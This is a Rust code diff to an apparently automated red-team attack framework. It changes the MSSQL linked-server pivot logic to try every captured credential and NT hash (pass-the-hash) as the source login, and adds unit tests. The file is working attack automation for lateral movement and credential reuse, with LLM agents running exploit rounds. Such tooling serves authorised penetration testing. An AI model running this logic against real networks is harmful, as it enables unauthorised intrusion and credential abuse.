@@ -121,76 +121,154 @@ fn same_target_impersonation_exploited(state: &StateInner, target: &str) -> bool
     })
 }
 
+/// Has any `mssql_access` / `mssql_xpcmdshell` vuln on the same `target` been
+/// marked exploited? Confirms we hold source-side access to the SQL Server the
+/// linked server hangs off of.
+///
+/// Without this the pivot only fires once the `mssql_linked_server` (or
+/// `mssql_impersonation`) vuln is *exploited* — but that vuln is exploited by
+/// the LLM deep-exploit round, which hops the link as an arbitrary owned login
+/// and fails cross-forest (`ANONYMOUS LOGON`), so it never gets credited. That
+/// starves the deterministic pivot, whose entire job is to succeed where the
+/// LLM fails by fanning out across owned principals until the mapped login is
+/// found. Gating on source-side access instead lets the pivot run as soon as
+/// we can reach the source SQL Server.
+fn same_target_mssql_access_exploited(state: &StateInner, target: &str) -> bool {
+    if target.is_empty() {
+        return false;
+    }
+    state.discovered_vulnerabilities.values().any(|v| {
+        (v.vuln_type.eq_ignore_ascii_case("mssql_access")
+            || v.vuln_type.eq_ignore_ascii_case("mssql_xpcmdshell"))
+            && v.target == target
+            && state.exploited_vulnerabilities.contains(&v.vuln_id)
+    })
+}
+
 async fn collect_pivot_work(dispatcher: &Dispatcher) -> Vec<PivotWork> {
     let state = dispatcher.state.read().await;
-    state
-        .discovered_vulnerabilities
-        .values()
-        .filter(|v| v.vuln_type.eq_ignore_ascii_case("mssql_linked_server"))
-        // Source-side access has to be confirmed before a cross-link
-        // probe can succeed — no point firing if we never authenticated
-        // to the source MSSQL. Accept EITHER the linked_server vuln itself
-        // being exploited (LLM round confirmed access) OR a same-target
+    let mut work = Vec::new();
+
+    for vuln in state.discovered_vulnerabilities.values() {
+        if !vuln.vuln_type.eq_ignore_ascii_case("mssql_linked_server") {
+            continue;
+        }
+        // Source-side access has to be confirmed before a cross-link probe
+        // can succeed — no point firing if we never authenticated to the
+        // source MSSQL. Accept EITHER the linked_server vuln itself being
+        // exploited (LLM round confirmed access) OR a same-target
         // `mssql_impersonation` being exploited (EXECUTE AS LOGIN proves
-        // source-side access AND grants the rights typically needed for
-        // openquery hops).
-        .filter_map(|vuln| {
-            let has_link_access = state.exploited_vulnerabilities.contains(&vuln.vuln_id);
-            let has_impersonation = same_target_impersonation_exploited(&state, &vuln.target);
-            if !has_link_access && !has_impersonation {
-                return None;
-            }
+        // source-side access).
+        let has_link_access = state.exploited_vulnerabilities.contains(&vuln.vuln_id);
+        let has_impersonation = same_target_impersonation_exploited(&state, &vuln.target);
+        let has_source_access = same_target_mssql_access_exploited(&state, &vuln.target);
+        if !has_link_access && !has_impersonation && !has_source_access {
+            continue;
+        }
 
-            let linked_server = vuln
-                .details
-                .get("linked_server")
-                .and_then(|v| v.as_str())
-                .filter(|s| !s.is_empty())?
-                .to_string();
-            let target_ip = resolve_mssql_target_ip(&vuln.details, &vuln.target);
-            if target_ip.is_empty() {
-                return None;
-            }
-            let domain = vuln
-                .details
-                .get("domain")
-                .and_then(|v| v.as_str())
-                .unwrap_or("")
-                .to_string();
+        let Some(linked_server) = vuln
+            .details
+            .get("linked_server")
+            .and_then(|v| v.as_str())
+            .filter(|s| !s.is_empty())
+            .map(|s| s.to_string())
+        else {
+            continue;
+        };
+        let target_ip = resolve_mssql_target_ip(&vuln.details, &vuln.target);
+        if target_ip.is_empty() {
+            continue;
+        }
+        let domain = vuln
+            .details
+            .get("domain")
+            .and_then(|v| v.as_str())
+            .unwrap_or("")
+            .to_string();
 
-            let dedup_key = format!("{}:{}", vuln.vuln_id, linked_server);
+        // A linked server's `sp_addlinkedsrvlogin` mapping is keyed on a
+        // SPECIFIC local login — the cross-link hop only authenticates when we
+        // connect to the source AS that exact principal, and rides the mapping
+        // to the remote login. We don't know which local login is mapped, so
+        // fan out: try every owned same-forest principal as the source
+        // identity (pass-the-hash for accounts we only hold an NT hash for)
+        // and let the result-driven dedup keep whichever one the mapping
+        // accepts. The previous behaviour impersonated `sa`, which NEVER works
+        // for a link hop — `sa` has no mapping, so the outbound connection
+        // drops to a credential-less context and the remote server records
+        // `ANONYMOUS LOGON`.
+        for (cred_username, cred_domain) in candidate_pivot_logins(&state, &domain) {
+            let dedup_key = format!("{}:{}:{}", vuln.vuln_id, linked_server, cred_username);
             if state.is_processed(DEDUP_MSSQL_LINK_PIVOT, &dedup_key) {
-                return None;
+                continue;
             }
-
-            // Same-domain credential preferred so the source-side bind
-            // doesn't fall through to Guest. Trusted-domain fallback
-            // mirrors the deep-exploit automation: the link hop rides
-            // the stored login mapping on the remote side, so any cred
-            // that authenticates to the source server is a valid trigger.
-            let same_domain = state.credentials.iter().find(|c| {
-                !c.password.is_empty()
-                    && !state.is_principal_quarantined(&c.username, &c.domain)
-                    && (domain.is_empty() || c.domain.eq_ignore_ascii_case(&domain))
-            });
-            let trust_fallback = if domain.is_empty() {
-                None
-            } else {
-                state.find_trust_credential(&domain)
-            };
-            let cred = same_domain.cloned().or(trust_fallback)?;
-
-            Some(PivotWork {
+            work.push(PivotWork {
                 vuln_id: vuln.vuln_id.clone(),
                 dedup_key,
-                target_ip,
-                linked_server,
-                cred_username: cred.username,
-                cred_domain: cred.domain,
-                impersonate_user: has_impersonation.then(|| "sa".to_string()),
-            })
-        })
-        .collect()
+                target_ip: target_ip.clone(),
+                linked_server: linked_server.clone(),
+                cred_username,
+                cred_domain,
+                impersonate_user: None,
+            });
+        }
+    }
+
+    work
+}
+
+/// Machine accounts (`$`), Windows auto-generated NetBIOS names, and built-in
+/// system principals never carry a useful linked-server login mapping, so
+/// they are never worth trying as a pivot source identity.
+fn is_unusable_pivot_login(username: &str) -> bool {
+    let u = username.to_lowercase();
+    u.is_empty()
+        || u.ends_with('$')
+        || u.starts_with("win-")
+        || u.starts_with("desktop-")
+        || matches!(u.as_str(), "krbtgt" | "guest")
+}
+
+/// Owned same-forest principals to try as the source-side login for a
+/// linked-server hop, ordered plaintext-creds-first then hash-only accounts.
+///
+/// Because the link mapping is keyed on one specific local login and we can't
+/// read which (the remote password in `sp_addlinkedsrvlogin` is encrypted), we
+/// enumerate every owned principal in the link's domain and let the pivot try
+/// each. Machine/system/quarantined accounts are skipped; each identity is
+/// emitted once.
+fn candidate_pivot_logins(state: &StateInner, domain: &str) -> Vec<(String, String)> {
+    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
+    let mut out: Vec<(String, String)> = Vec::new();
+
+    let creds = state
+        .credentials
+        .iter()
+        .filter(|c| !c.password.is_empty())
+        .map(|c| (c.username.as_str(), c.domain.as_str()));
+    let hashes = state
+        .hashes
+        .iter()
+        .filter(|h| !h.hash_value.is_empty())
+        .map(|h| (h.username.as_str(), h.domain.as_str()));
+
+    for (username, dom) in creds.chain(hashes) {
+        if is_unusable_pivot_login(username) {
+            continue;
+        }
+        if !domain.is_empty() && !dom.eq_ignore_ascii_case(domain) {
+            continue;
+        }
+        if state.is_principal_quarantined(username, dom) {
+            continue;
+        }
+        let key = format!("{}\\{}", dom.to_lowercase(), username.to_lowercase());
+        if seen.insert(key) {
+            out.push((username.to_string(), dom.to_string()));
+        }
+    }
+
+    out
 }
 
 async fn run_pivot_probe(dispatcher: Arc<Dispatcher>, item: PivotWork) {
@@ -635,6 +713,57 @@ mod tests {
         }
     }
 
+    fn cred(username: &str, password: &str, domain: &str) -> ares_core::models::Credential {
+        ares_core::models::Credential {
+            id: format!("c-{username}"),
+            username: username.into(),
+            password: password.into(), // pragma: allowlist secret
+            domain: domain.into(),
+            source: "test".into(),
+            is_admin: false,
+            discovered_at: None,
+            parent_id: None,
+            attack_step: 0,
+        }
+    }
+
+    #[test]
+    fn unusable_pivot_logins_are_filtered() {
+        assert!(is_unusable_pivot_login("dc01$"));
+        assert!(is_unusable_pivot_login("WIN-ABC123"));
+        assert!(is_unusable_pivot_login("DESKTOP-XYZ"));
+        assert!(is_unusable_pivot_login("krbtgt"));
+        assert!(is_unusable_pivot_login("Guest"));
+        assert!(is_unusable_pivot_login(""));
+        assert!(!is_unusable_pivot_login("alice"));
+        assert!(!is_unusable_pivot_login("svc_sql"));
+    }
+
+    #[test]
+    fn candidate_pivot_logins_enumerates_owned_same_domain_users() {
+        let mut state = StateInner::new("op-test".into());
+        state
+            .credentials
+            .push(cred("alice", "P@ssw0rd!", "contoso.local"));
+        state
+            .credentials
+            .push(cred("bob", "Hunter2!", "contoso.local"));
+        // Machine account and a different-forest user must be excluded.
+        state.credentials.push(cred("dc01$", "x", "contoso.local"));
+        state.credentials.push(cred("carol", "y", "fabrikam.local"));
+        // Duplicate identity must collapse.
+        state
+            .credentials
+            .push(cred("alice", "P@ssw0rd!", "contoso.local"));
+
+        let got = candidate_pivot_logins(&state, "contoso.local");
+        assert!(got.contains(&("alice".to_string(), "contoso.local".to_string())));
+        assert!(got.contains(&("bob".to_string(), "contoso.local".to_string())));
+        assert!(!got.iter().any(|(u, _)| u == "dc01$"));
+        assert!(!got.iter().any(|(u, _)| u == "carol"));
+        assert_eq!(got.iter().filter(|(u, _)| u == "alice").count(), 1);
+    }
+
     #[test]
     fn probe_args_carry_linked_server_and_query() {
         let args = build_probe_args(&sample_work());
@@ -850,6 +979,42 @@ mod tests {
         ));
         // Empty target — defensive: must NOT open.
         assert!(!same_target_impersonation_exploited(&state, ""));
+    }
+
+    #[test]
+    fn source_mssql_access_opens_pivot_gate() {
+        // The deterministic pivot must fire off SOURCE-side MSSQL access
+        // (mssql_access exploited on the SQL host). The LLM's linked-server
+        // exploit hops as an arbitrary owned login and fails cross-forest
+        // (ANONYMOUS LOGON), so the linked_server vuln never gets credited —
+        // gating on source access lets the pivot fan out across owned
+        // principals regardless of whether the LLM ever confirmed the hop.
+        use ares_core::models::VulnerabilityInfo;
+        use std::collections::HashMap;
+
+        let mut state = StateInner::new("op-test".into());
+        let acc = VulnerabilityInfo {
+            vuln_id: "mssql_192_168_58_51".into(),
+            vuln_type: "mssql_access".into(),
+            target: "192.168.58.51".into(),
+            discovered_by: "auto_mssql_detection".into(),
+            discovered_at: chrono::Utc::now(),
+            details: HashMap::new(),
+            recommended_agent: "lateral".into(),
+            priority: 3,
+        };
+        state
+            .discovered_vulnerabilities
+            .insert(acc.vuln_id.clone(), acc.clone());
+
+        // Discovered but not yet exploited → gate stays closed.
+        assert!(!same_target_mssql_access_exploited(&state, "192.168.58.51"));
+
+        state.exploited_vulnerabilities.insert(acc.vuln_id);
+        assert!(same_target_mssql_access_exploited(&state, "192.168.58.51"));
+        // Different / empty target must NOT open the gate.
+        assert!(!same_target_mssql_access_exploited(&state, "192.168.58.99"));
+        assert!(!same_target_mssql_access_exploited(&state, ""));
     }
 
     #[test]
